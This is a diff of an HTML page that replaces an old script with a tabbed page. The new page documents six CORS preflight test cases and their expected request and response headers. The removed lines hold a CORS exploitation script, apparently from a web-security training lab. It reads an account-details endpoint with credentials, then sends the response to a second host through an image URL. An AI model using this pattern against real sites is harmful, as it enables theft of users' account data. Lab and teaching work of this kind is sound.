@@ -1,29 +1,182 @@
 <!DOCTYPE html>
 <html>
 <head>
-<meta charset="ISO-8859-1">
-<title>Insert title here</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<style>
+body {
+	font-family: Arial;
+}
+
+/* Style the tab */
+.tab {
+	overflow: hidden;
+	border: 1px solid #ccc;
+	background-color: #f1f1f1;
+}
+
+/* Style the buttons inside the tab */
+.tab button {
+	background-color: inherit;
+	float: left;
+	border: none;
+	outline: none;
+	cursor: pointer;
+	padding: 14px 16px;
+	transition: 0.3s;
+	font-size: 17px;
+}
+
+/* Change background color of buttons on hover */
+.tab button:hover {
+	background-color: #ddd;
+}
+
+/* Create an active/current tablink class */
+.tab button.active {
+	background-color: #ccc;
+}
+
+/* Style the tab content */
+.tabcontent {
+	display: none;
+	padding: 6px 12px;
+	border: 1px solid #ccc;
+	border-top: none;
+}
+</style>
 </head>
 <body>
-<script>
-	var xhr = new XMLHttpRequest();
-	var response ="test";
-	document.location="http://fcuk.off"
 
-	xhr.open('GET', "https://aca61f051e0346c780c833d900200093.web-security-academy.net/accountDetails", false);
+	<h2>Tabs</h2>
+	<p>Click on the buttons inside the tabbed menu:</p>
 
-	xhr.onreadystatechange = function()
-	{
-		if (this.readyState == 4 && this.status == 200)
-		{
-		  
-			response = encodeURI(this.responseText);
+	<div class="tab">
+		<button class="tablinks" onclick="displayInstruction(event, 'case1')">Case
+			1</button>
+		<button class="tablinks" onclick="displayInstruction(event, 'case2')">Case
+			2</button>
+		<button class="tablinks" onclick="displayInstruction(event, 'case3')">Case
+			3</button>
+		<button class="tablinks" onclick="displayInstruction(event, 'case4')">Case
+			4</button>
+		<button class="tablinks" onclick="displayInstruction(event, 'case5')">Case
+			5</button>
+		<button class="tablinks" onclick="displayInstruction(event, 'case6')">Case
+			6</button>
+	</div>
+
+	<div id="case1" class="tabcontent">
+		<h3>POST Request & Content-Type: application/json (error)</h3>
+		<ul>
+			<li>Request is pre-flighted i.e. browser sends OPTIONS request
+				before actual request.</li>
+			<li>Origin is set to http://localhost:8080 in Request Headers.</li>
+			<li>Custom header Access-Control-Request-Headers: content-type
+				in Request Headers</li>
+			<li>Access-Control-Allow-Origin: http://localhost:8080 in
+				Response Headers</li>
+			<li>CORS error in Console tab: Access-Control-Allow-Headers
+				absent from Response Headers.</li>
+		</ul>
+	</div>
+
+	<div id="case2" class="tabcontent">
+		<h3>POST Request & Content-Type: application/json (success)</h3>
+		<ul>
+			<li>Request is pre-flighted i.e. browser sends OPTIONS request
+				before actual request.</li>
+			<li>Origin is set to http://localhost:8080 in Request Headers.</li>
+			<li>Custom Access-Control-Request-Headers: content-type in
+				Request Headers</li>
+			<li>Access-Control-Allow-Origin: http://localhost:8080 in
+				Response Headers</li>
+			<li>Access-Control-Allow-Headers: content-type in Response
+				Headers.</li>
+			<li>Request Method: POST in General.</li>
+			<li>Response displayed in 'Cross Origin Response:'.</li>
+	</div>
+
+
+	<div id="case3" class="tabcontent">
+		<h3>PUT Request (error)</h3>
+		<ul>
+			<li>Request is pre-flighted i.e. browser sends OPTIONS request
+				before actual request.</li>
+			<li>Origin is set to http://localhost:8080 in Request Headers.</li>
+			<li>Access-Control-Request-Method: PUT in Request Headers</li>
+			<li>Access-Control-Allow-Origin: http://localhost:8080 in
+				Response Headers</li>
+			<li>CORS error in Console tab: Access-Control-Allow-Methods
+				absent from Response Headers.</li>
+		</ul>
+	</div>
+
+	<div id="case4" class="tabcontent">
+		<h3>PUT Request (success)</h3>
+		<ul>
+			<li>Request is pre-flighted i.e. browser sends OPTIONS request
+				before actual request.</li>
+			<li>Origin is set to http://localhost:8080 in Request Headers.</li>
+			<li>Access-Control-Request-Method: PUT in Request Headers.</li>
+			<li>Access-Control-Allow-Origin: http://localhost:8080 in
+				Response Headers.</li>
+			<li>Access-Control-Allow-Methods: PUT in Response Headers.</li>
+			<li>Request Method: POST in General.</li>
+			<li>Response displayed in 'Cross Origin Response:'.</li>
+		</ul>
+	</div>
+
+	<div id="case5" class="tabcontent">
+		<h3>POST Request with Credentials (error)</h3>
+		<ul>
+			<li>Request is pre-flighted i.e. browser sends OPTIONS request
+				before actual request.</li>
+			<li>Origin is set to http://localhost:8080 in Request Headers.</li>
+			<li>Access-Control-Request-Headers: content-type in Request
+				Headers.</li>
+			<li>Access-Control-Allow-Headers: content-type in Response
+				Headers.</li>
+			<li>Access-Control-Allow-Origin: http://localhost:8080 in
+				Response Headers</li>
+			<li>CORS error in Console tab: Access-Control-Allow-Credentials
+				absent from Response Headers.</li>
+		</ul>
+	</div>
+
+	<div id="case6" class="tabcontent">
+		<h3>POST Request with Credentials (success)</h3>
+		<ul>
+			<li>Request is pre-flighted i.e. browser sends OPTIONS request
+				before actual request.</li>
+			<li>Origin is set to http://localhost:8080 in Request Headers.</li>
+			<li>Access-Control-Request-Headers: content-type in Request
+				Headers.</li>
+			<li>Access-Control-Allow-Headers: content-type in Response
+				Headers</li>
+			<li>Access-Control-Allow-Origin: http://localhost:8080 in
+				Response Headers</li>
+			<li>Access-Control-Allow-Credentials: true in Response Headers</li>
+
+			<li>Response displayed in 'Cross Origin Response:'.</li>
+		</ul>
+	</div>
+
+	<script>
+		function displayInstruction(evt, testCase) {
+			var i, tabcontent, tablinks;
+			tabcontent = document.getElementsByClassName("tabcontent");
+			for (i = 0; i < tabcontent.length; i++) {
+				tabcontent[i].style.display = "none";
+			}
+			tablinks = document.getElementsByClassName("tablinks");
+			for (i = 0; i < tablinks.length; i++) {
+				tablinks[i].className = tablinks[i].className.replace(
+						" active", "");
+			}
+			document.getElementById(testCase).style.display = "block";
+			evt.currentTarget.className += " active";
 		}
-	};
-	xhr.withCredentials = true;
-	xhr.send();
-	document.write("<img src=https://ac2e1f331e3246dc808e333e012c0075.web-security-academy.net/?log="+response+">")
+	</script>
 
-</script>
 </body>
 </html>
